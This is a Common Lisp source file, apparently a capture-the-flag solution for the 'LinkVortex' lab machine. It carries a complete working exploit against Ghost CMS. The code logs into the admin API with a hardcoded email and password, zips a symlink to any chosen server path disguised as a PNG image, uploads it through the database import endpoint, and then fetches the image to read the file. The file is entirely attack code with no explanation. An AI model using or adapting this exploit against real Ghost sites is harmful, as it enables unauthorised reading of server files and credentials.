(in-package :grimoire) 

(defun linkvortex/cookie-jar (username password)
  "get the cookie for auth"
  (let ((cookie-jar (cl-cookie:make-cookie-jar)))
    (dex:post "http://linkvortex.htb/ghost/api/v3/admin/session/"
              :cookie-jar cookie-jar
              :headers '(("Accept-Version" . "v3.0")
                         ("Content-Type" . "application/x-www-form-urlencoded"))
              :content `(("username" . ,username)
                         ("password" . ,password)))
    cookie-jar))

(defun linkvortex/create-exploit (path)
  "create a symlink to the path and zip it"
  (ensure-directories-exist (project-path "exploit/content/images/2025/"))
  
  (let* ((uid (random-string 16))
         (image-path (project-path (format nil "exploit/content/images/2025/~a.png" uid))))
    (uiop:run-program (format nil "ln -s ~a ~a" path image-path))
    (uiop:run-program (format nil "cd ~a && zip -r -y ~a.zip ~a" 
                              *project-dir* uid "exploit/"))
    
    uid))

(defun linkvortex/send-exploit (uid cookie-jar)
  "upload the content to the website as an image"
  (dex:post "http://linkvortex.htb/ghost/api/v3/admin/db"
            :cookie-jar cookie-jar
            :content `(("importfile" . ,(project-path (str:concat uid ".zip"))))))

(defun linkvortex/read-results (uid)
  "read the image"
  (trivial-utf-8:utf-8-bytes-to-string
   (dex:get (format nil "http://linkvortex.htb/content/images/2025/~a.png" uid))))
 
(defun linkvortex/read (path)
  "read function for linkvortex"
  (let ((uid (linkvortex/create-exploit path))
        (cookie-jar (linkvortex/cookie-jar "admin@linkvortex.htb" "OctopiFociPilfer45")))
    (linkvortex/send-exploit uid cookie-jar)
    (delete-file (project-path (str:concat uid ".zip")))
    (uiop:delete-directory-tree (project-path "exploit/") :validate t)
    (linkvortex/read-results uid)))
